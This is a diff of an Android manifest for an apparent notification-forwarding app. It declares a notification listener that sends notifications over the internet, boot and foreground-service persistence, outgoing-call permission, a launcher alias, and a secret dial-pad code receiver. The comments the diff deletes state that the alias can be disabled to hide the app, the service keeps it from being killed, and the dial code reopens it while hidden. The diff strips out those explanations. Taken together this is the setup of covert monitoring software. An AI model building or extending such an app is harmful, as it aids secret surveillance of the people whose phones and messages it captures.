@@ -1,52 +1,43 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.notifforwarder.app">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
 
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
     <application
         android:allowBackup="true"
-        android:icon="@mipmap/ic_launcher"
+        android:icon="@android:drawable/ic_menu_share"
         android:label="@string/app_name"
-        android:roundIcon="@mipmap/ic_launcher_round"
-        android:supportsRtl="true"
-        android:theme="@style/Theme.NotifForwarder">
+        android:theme="@style/AppTheme">
 
-        <!-- Activity utama (tidak punya launcher intent sendiri) -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
-            android:launchMode="singleTop"/>
+            android:launchMode="singleTop" />
 
-        <!-- Halaman filter aplikasi -->
-        <activity
-            android:name=".AppFilterActivity"
-            android:exported="false"
-            android:label="Filter Aplikasi"
-            android:parentActivityName=".MainActivity"/>
-
-        <!-- Alias ini yang tampil di launcher, bisa di-disable untuk sembunyi -->
         <activity-alias
             android:name=".MainLauncher"
             android:targetActivity=".MainActivity"
             android:exported="true"
             android:enabled="true"
-            android:label="@string/app_name"
-            android:icon="@mipmap/ic_launcher">
+            android:label="@string/app_name">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity-alias>
 
-        <!-- NotificationListenerService -->
+        <activity
+            android:name=".AppFilterActivity"
+            android:exported="false"
+            android:label="@string/filter_title" />
+
         <service
             android:name=".NotificationForwarderService"
-            android:label="Notification Forwarder"
             android:exported="true"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter>
@@ -54,13 +45,11 @@
             </intent-filter>
         </service>
 
-        <!-- Foreground Service penjaga agar tidak dibunuh sistem -->
         <service
             android:name=".PersistentService"
             android:exported="false"
-            android:foregroundServiceType="dataSync"/>
+            android:foregroundServiceType="dataSync" />
 
-        <!-- Boot receiver -->
         <receiver
             android:name=".BootReceiver"
             android:exported="true">
@@ -69,7 +58,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Kode rahasia via dial pad untuk membuka app saat tersembunyi -->
         <receiver
             android:name=".SecretCodeReceiver"
             android:exported="true">
